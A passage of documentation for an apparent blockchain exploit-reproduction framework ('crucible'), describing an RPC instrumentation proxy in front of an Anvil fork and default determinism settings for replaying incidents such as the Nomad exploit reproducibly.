An HTTP proxy that sits between your attack code and the Anvil fork. Every transaction flows through it, and it automatically captures gas usage, contract events, storage changes, and balance changes ΓÇö all without any instrumentation code in your attack.

Your Attack Code ΓåÆ Proxy (random port) ΓåÆ Anvil (port 8545)
                  Γåô
         Captures: gas, events, storage diffs, balance diffs
         ΓåÆ written to JSONL files

docs.title: Why It Matters
docs.text:
• Zero instrumentation code ΓÇö no logging, no tracing, no manual capture
  • Universal ΓÇö works with Python, forge script, cast send, or any JSON-RPC client
  • Complete ΓÇö every transaction is captured, not just the ones you remembered
  • Standardized ΓÇö all artifacts use the same JSONL format, regardless of attack type

docs.title: How to Use It
docs.text:
The proxy starts automatically when you run an experiment:

# Just run an experiment ΓÇö proxy starts, captures everything
crucible experiment run experiments/nomad_replay.yaml

Your attack plugin uses context.chains.runtime_for("ethereum") to get the RPC URL. The framework silently returns the proxy URL ΓÇö your plugin never knows it's being instrumented.

To use the proxy standalone (without an experiment):

# Terminal 1: Start Anvil
anvil --fork-url https://eth.llamarpc.com --fork-block-number 15259100

# Terminal 2: Start the instrumentation proxy
crucible instrument --upstream http://127.0.0.1:8545 --chain ethereum --output-dir ./logs/my_run

# Terminal 3: Send transactions through the proxy
cast send --rpc-url http://127.0.0.1:<proxy-port> 0xTarget --value 1ether

To check if instrumentation is working:

crucible verify logs/demo_experiment/DS-2026-00001

docs.title: What Gets Captured
docs.text: Artifact Captured From Stream File Gas used eth_getTransactionReceipt ΓåÆ gasUsed gas_profile.jsonl Contract events Receipt ΓåÆ logs[] ΓåÆ decode topic[0] events.jsonl Storage diffs debug_traceTransaction with prestateTracer diffMode storage_diffs.jsonl Balance changes Trace pre/post account balances balance_diffs.jsonl

docs.title: Troubleshooting
docs.text: If debug_traceTransaction fails (known Anvil nightly-build issue), the proxy still captures gas + events from the receipt. Storage diffs and balance changes are lost, and a warning is logged. Upgrade to a stable Foundry release to fix this.

docs.title: What It Is
docs.text:
Every experiment runs with deterministic flags that ensure the same input produces the same output every time. These flags are set by default ΓÇö you must explicitly opt out.

# Default determinism config (applied automatically)
determinism:
  gas_price: 0               # Fixed gas price ΓÇö no gas auction variance
  block_base_fee: 1000000000 # Fixed base fee
  timestamp: fork_block      # Pinned to the fork block's timestamp
  auto_mine: true            # Transactions mined instantly
  order: fifo                # FIFO order ΓÇö no mempool reordering

docs.title: Why It Matters
docs.text:
Blockchain forks are inherently non-deterministic: - Different RPC providers return different historical state - Transactions can be ordered differently in the mempool - Gas prices fluctuate - Block timestamps vary

Without determinism, you can't prove that your reproduction is correct ΓÇö the outcome might change on every run. Determinism enables:

  • Verifiable reproductions ΓÇö anyone running the same experiment gets the same result
  • Diff comparisons ΓÇö crucible diff can detect meaningful differences
  • Publication ΓÇö reviewers can trust your results

docs.title: How to Use It
docs.text:
You don't need to do anything. Determinism is the default. Just run your experiment:

crucible experiment run experiments/nomad_replay.yaml

To verify determinism, run twice and compare:

crucible experiment run experiments/nomad_replay.yaml --name run-a
crucible experiment run experiments/nomad_replay.yaml --name run-b
crucible diff run-a run-b

Expected output:

{
  "storage_equal": true,
  "events_equal": true,
  "gas_equal": true,
